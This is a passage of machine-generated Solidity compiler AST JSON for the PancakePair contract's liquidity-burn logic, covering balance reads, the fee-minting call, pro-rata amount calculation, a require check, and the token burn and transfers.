															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1189,
												"initialValue": {
													"argumentTypes": null,
													"id": 1188,
													"name": "token1",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 477,
													"src": "8038:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8020:24:1"
											},
											{
												"assignments": [
													1191
												],
												"declarations": [
													{
														"constant": false,
														"id": 1191,
														"name": "balance0",
														"nodeType": "VariableDeclaration",
														"scope": 1327,
														"src": "8069:13:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1190,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "8069:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1200,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1197,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2475,
																	"src": "8119:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_PancakePair_$1700",
																		"typeString": "contract PancakePair"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_PancakePair_$1700",
																		"typeString": "contract PancakePair"
																	}
																],
																"id": 1196,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "8111:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 1198,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8111:13:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1193,
																	"name": "_token0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1183,
																	"src": "8092:7:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1192,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1784,
																"src": "8085:6:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$1784_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 1194,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8085:15:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$1784",
																"typeString": "contract IERC20"
															}
														},
														"id": 1195,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balanceOf",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 1745,
														"src": "8085:25:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address) view external returns (uint256)"
														}
													},
													"id": 1199,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8085:40:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8069:56:1"
											},
											{
												"assignments": [
													1202
												],
												"declarations": [
													{
														"constant": false,
														"id": 1202,
														"name": "balance1",
														"nodeType": "VariableDeclaration",
														"scope": 1327,
														"src": "8135:13:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1201,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "8135:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1211,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1208,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2475,
																	"src": "8185:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_PancakePair_$1700",
																		"typeString": "contract PancakePair"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_PancakePair_$1700",
																		"typeString": "contract PancakePair"
																	}
																],
																"id": 1207,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "8177:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 1209,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8177:13:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1204,
																	"name": "_token1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1187,
																	"src": "8158:7:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1203,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1784,
																"src": "8151:6:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$1784_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 1205,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8151:15:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$1784",
																"typeString": "contract IERC20"
															}
														},
														"id": 1206,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balanceOf",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 1745,
														"src": "8151:25:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address) view external returns (uint256)"
														}
													},
													"id": 1210,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8151:40:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8135:56:1"
											},
											{
												"assignments": [
													1213
												],
												"declarations": [
													{
														"constant": false,
														"id": 1213,
														"name": "liquidity",
														"nodeType": "VariableDeclaration",
														"scope": 1327,
														"src": "8201:14:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1212,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "8201:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1219,
												"initialValue": {
													"argumentTypes": null,
													"baseExpression": {
														"argumentTypes": null,
														"id": 1214,
														"name": "balanceOf",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 23,
														"src": "8218:9:1",
														"typeDescriptions": {
															"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
															"typeString": "mapping(address => uint256)"
														}
													},
													"id": 1218,
													"indexExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 1216,
																"name": "this",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2475,
																"src": "8236:4:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_PancakePair_$1700",
																	"typeString": "contract PancakePair"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_contract$_PancakePair_$1700",
																	"typeString": "contract PancakePair"
																}
															],
															"id": 1215,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "8228:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_address_$",
																"typeString": "type(address)"
															},
															"typeName": "address"
														},
														"id": 1217,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "8228:13:1",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "IndexAccess",
													"src": "8218:24:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8201:41:1"
											},
											{
												"assignments": [
													1221
												],
												"declarations": [
													{
														"constant": false,
														"id": 1221,
														"name": "feeOn",
														"nodeType": "VariableDeclaration",
														"scope": 1327,
														"src": "8253:10:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 1220,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "8253:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1226,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1223,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1176,
															"src": "8275:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 1224,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1178,
															"src": "8286:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 1222,
														"name": "_mintFee",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 874,
														"src": "8266:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint112_$_t_uint112_$returns$_t_bool_$",
															"typeString": "function (uint112,uint112) returns (bool)"
														}
													},
													"id": 1225,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8266:30:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8253:43:1"
											},
											{
												"assignments": [
													1228
												],
												"declarations": [
													{
														"constant": false,
														"id": 1228,
														"name": "_totalSupply",
														"nodeType": "VariableDeclaration",
														"scope": 1327,
														"src": "8306:17:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1227,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "8306:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1230,
												"initialValue": {
													"argumentTypes": null,
													"id": 1229,
													"name": "totalSupply",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 19,
													"src": "8326:11:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8306:31:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1238,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1231,
														"name": "amount0",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1171,
														"src": "8425:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 1237,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1234,
																	"name": "balance0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1191,
																	"src": "8449:8:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"id": 1232,
																	"name": "liquidity",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1213,
																	"src": "8435:9:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 1233,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "mul",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 2385,
																"src": "8435:13:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 1235,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8435:23:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "/",
														"rightExpression": {
															"argumentTypes": null,
															"id": 1236,
															"name": "_totalSupply",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1228,
															"src": "8461:12:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "8435:38:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "8425:48:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1239,
												"nodeType": "ExpressionStatement",
												"src": "8425:48:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1247,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1240,
														"name": "amount1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1173,
														"src": "8531:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 1246,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1243,
																	"name": "balance1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1202,
																	"src": "8555:8:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"id": 1241,
																	"name": "liquidity",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1213,
																	"src": "8541:9:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 1242,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "mul",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 2385,
																"src": "8541:13:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 1244,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8541:23:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "/",
														"rightExpression": {
															"argumentTypes": null,
															"id": 1245,
															"name": "_totalSupply",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1228,
															"src": "8567:12:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "8541:38:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "8531:48:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1248,
												"nodeType": "ExpressionStatement",
												"src": "8531:48:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 1256,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1252,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1250,
																	"name": "amount0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1171,
																	"src": "8658:7:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": ">",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 1251,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "8668:1:1",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "8658:11:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "&&",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1255,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1253,
																	"name": "amount1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1173,
																	"src": "8673:7:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": ">",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 1254,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "8683:1:1",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "8673:11:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "8658:26:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4255524e4544",
															"id": 1257,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "8698:40:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_6c050b0a8d3f2d18d11271ee0a551b7748437b8fa9a6165c561190d34a2947d6",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_LIQUIDITY_BURNED\""
															},
															"value": "Pancake: INSUFFICIENT_LIQUIDITY_BURNED"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_6c050b0a8d3f2d18d11271ee0a551b7748437b8fa9a6165c561190d34a2947d6",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_LIQUIDITY_BURNED\""
															}
														],
														"id": 1249,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2446,
															2447
														],
														"referencedDeclaration": 2447,
														"src": "8637:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1258,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8637:111:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1259,
												"nodeType": "ExpressionStatement",
												"src": "8637:111:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1262,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2475,
																	"src": "8772:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_PancakePair_$1700",
																		"typeString": "contract PancakePair"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_PancakePair_$1700",
																		"typeString": "contract PancakePair"
																	}
																],
																"id": 1261,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "8764:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 1263,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "8764:13:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1264,
															"name": "liquidity",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1213,
															"src": "8779:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1260,
														"name": "_burn",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 206,
														"src": "8758:5:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,uint256)"
														}
													},
													"id": 1265,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8758:31:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1266,
												"nodeType": "ExpressionStatement",
												"src": "8758:31:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1268,
															"name": "_token0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1183,
															"src": "8813:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1269,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1166,
															"src": "8822:2:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1270,
															"name": "amount0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1171,
															"src": "8826:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1267,
														"name": "_safeTransfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 577,
														"src": "8799:13:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 1271,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8799:35:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1272,
												"nodeType": "ExpressionStatement",
												"src": "8799:35:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1274,
															"name": "_token1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1187,
															"src": "8858:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1275,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1166,
															"src": "8867:2:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1276,
															"name": "amount1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1173,
															"src": "8871:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1273,
														"name": "_safeTransfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 577,
														"src": "8844:13:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 1277,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8844:35:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1278,
												"nodeType": "ExpressionStatement",
												"src": "8844:35:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1288,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
